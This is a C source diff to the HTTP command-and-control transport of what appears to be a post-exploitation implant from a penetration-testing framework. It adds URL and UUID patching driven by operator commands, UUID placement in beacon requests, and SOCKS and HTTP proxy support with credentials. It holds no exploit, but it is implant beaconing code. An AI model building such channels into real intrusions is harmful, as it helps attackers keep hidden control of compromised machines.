@@ -130,6 +130,20 @@ static char *get_uuid_from_uri(const char *uri)
 	return uuid;
 }
 
+/*
+ * Resolve the per-transport UUID used for C2 profile placement. Prefers the
+ * value supplied via TLV_TYPE_C2_UUID; falls back to the URL path's last
+ * segment when unset. Returned string is malloc'd; caller frees.
+ */
+static char *get_transport_uuid(struct http_ctx *ctx)
+{
+	struct c2_transport_config *tc = c2_transport_get_config(ctx->t);
+	if (tc && tc->c2_uuid && *tc->c2_uuid) {
+		return strdup(tc->c2_uuid);
+	}
+	return get_uuid_from_uri(ctx->uri);
+}
+
 static char *build_profile_url(const char *base_uri, struct c2_verb_config *vc, const char *uuid)
 {
 	if (!vc || !vc->uri) {
@@ -172,28 +186,53 @@ static void patch_uri(struct http_ctx *ctx, struct buffer_queue *q)
 {
 	struct tlv_packet *request = tlv_packet_read_buffer_queue(NULL, q);
 	if (request) {
-		uint32_t command_id;
+		uint32_t command_id = 0;
 		tlv_packet_get_u32(request, TLV_TYPE_COMMAND_ID, &command_id);
 
-		const char *new_uuid = tlv_packet_get_str(request, TLV_TYPE_C2_UUID);
+		if (command_id == COMMAND_ID_CORE_PATCH_URL) {
+			/*
+			 * Two encodings supported:
+			 *  - TLV_TYPE_C2_UUID (newer): bare UUID string; replace the
+			 *    last path segment and update tc->c2_uuid so subsequent
+			 *    profile placement (uuid_get/header/cookie) picks it up.
+			 *  - TLV_TYPE_TRANS_URL (legacy): the full URI suffix.
+			 */
+			const char *new_uuid = tlv_packet_get_str(request, TLV_TYPE_C2_UUID);
+			const char *new_uri = tlv_packet_get_str(request, TLV_TYPE_TRANS_URL);
 
-		if (command_id == COMMAND_ID_CORE_PATCH_UUID && new_uuid) {
-			log_info("HTTP patching uuid to: %s\n", new_uuid);
-			char *old_uri = ctx->uri;
-			char *split = ctx->uri;
-			char *host = strstr(old_uri, "://");
-			if (host) {
-				split = strchr(host + 3, '/');
-			} else {
-				split = strrchr(old_uri, '/');
+			char *replacement = NULL;
+			if (new_uuid) {
+				if (asprintf(&replacement, "/%s", new_uuid) < 0) {
+					replacement = NULL;
+				}
+				struct c2_transport_config *tc = c2_transport_get_config(ctx->t);
+				if (tc) {
+					free(tc->c2_uuid);
+					tc->c2_uuid = strdup(new_uuid);
+				}
+			} else if (new_uri) {
+				replacement = strdup(new_uri);
 			}
-			if (split) {
-				*split = '\0';
-			}
-			if (asprintf(&ctx->uri, "%s/%s", ctx->uri, new_uuid) > 0) {
-				free(old_uri);
+
+			if (replacement) {
+				char *old_uri = ctx->uri;
+				char *split = ctx->uri;
+				char *host = strstr(old_uri, "://");
+				if (host) {
+					split = strchr(host + 3, '/');
+				} else {
+					split = strrchr(old_uri, '/');
+				}
+				if (split) {
+					*split = '\0';
+				}
+				if (asprintf(&ctx->uri, "%s%s", ctx->uri, replacement) > 0) {
+					free(old_uri);
+				}
+				free(replacement);
 			}
 		}
+		tlv_packet_free(request);
 	}
 	else {
 		/**
@@ -346,7 +385,7 @@ static void add_profile_headers(struct http_ctx *ctx, struct c2_verb_config *vc)
 {
 	if (!vc) return;
 
-	char *uuid = get_uuid_from_uri(ctx->uri);
+	char *uuid = get_transport_uuid(ctx);
 	if (!uuid) return;
 
 	if (vc->uuid_header) {
@@ -387,7 +426,7 @@ static void http_poll_timer_cb(struct ev_loop *loop, struct ev_timer *w, int rev
 			ctx->data.content_len = encoded_len;
 		}
 
-		char *uuid = get_uuid_from_uri(ctx->uri);
+		char *uuid = get_transport_uuid(ctx);
 		char *post_url = build_profile_url(ctx->uri, post_profile, uuid);
 		free(uuid);
 		add_profile_headers(ctx, post_profile);
@@ -401,7 +440,7 @@ static void http_poll_timer_cb(struct ev_loop *loop, struct ev_timer *w, int rev
 	}
 
 	if (!sent) {
-		char *uuid = get_uuid_from_uri(ctx->uri);
+		char *uuid = get_transport_uuid(ctx);
 		char *get_url = build_profile_url(ctx->uri, get_profile, uuid);
 		free(uuid);
 		add_profile_headers(ctx, get_profile);
@@ -426,6 +465,9 @@ static void http_ctx_free(struct http_ctx *ctx)
 		free(ctx->data.ua);
 		free(ctx->data.referer);
 		free(ctx->data.cookie_list);
+		free((void *)ctx->opts.proxy.hostname);
+		free((void *)ctx->opts.proxy.auth_user);
+		free((void *)ctx->opts.proxy.auth_pass);
 		free(ctx);
 	}
 }
@@ -441,6 +483,57 @@ static int add_header(struct http_ctx *ctx, const char *header)
 		}
 	}
 	return -1;
+}
+
+/*
+ * Parse a proxy URL of the form "scheme://host:port" or "socks=host:port"
+ * (the latter being the framework's SOCKS encoding) and populate the
+ * transport's http_request_opts.proxy fields. Adds basic auth credentials
+ * when configured.
+ */
+static void apply_proxy_config(struct http_ctx *ctx, struct c2_transport_config *tc)
+{
+	const char *url = tc->proxy_url;
+	enum http_proxy_type type = http_proxy_http;
+	const char *host_start;
+
+	if (strncmp(url, "socks=", 6) == 0) {
+		type = http_proxy_socks5;
+		host_start = url + 6;
+	} else if (strncmp(url, "socks://", 8) == 0) {
+		type = http_proxy_socks5;
+		host_start = url + 8;
+	} else if (strncmp(url, "http://", 7) == 0) {
+		host_start = url + 7;
+	} else if (strncmp(url, "https://", 8) == 0) {
+		host_start = url + 8;
+	} else {
+		host_start = url;
+	}
+
+	const char *colon = strrchr(host_start, ':');
+	if (!colon) {
+		return;
+	}
+	size_t host_len = colon - host_start;
+	char *host = malloc(host_len + 1);
+	if (!host) {
+		return;
+	}
+	memcpy(host, host_start, host_len);
+	host[host_len] = '\0';
+
+	ctx->opts.proxy.type = type;
+	ctx->opts.proxy.hostname = host;
+	ctx->opts.proxy.port = (uint16_t)atoi(colon + 1);
+
+	if (tc->proxy_user && *tc->proxy_user) {
+		ctx->opts.proxy.auth_type = http_auth_basic;
+		ctx->opts.proxy.auth_user = strdup(tc->proxy_user);
+		if (tc->proxy_pass) {
+			ctx->opts.proxy.auth_pass = strdup(tc->proxy_pass);
+		}
+	}
 }
 
 int http_transport_init(struct c2_transport *t)
@@ -478,6 +571,9 @@ int http_transport_init(struct c2_transport *t)
 				line = strtok(NULL, "\r\n");
 			}
 			free(hdrs);
+		}
+		if (tc->proxy_url && *tc->proxy_url) {
+			apply_proxy_config(ctx, tc);
 		}
 	}
 
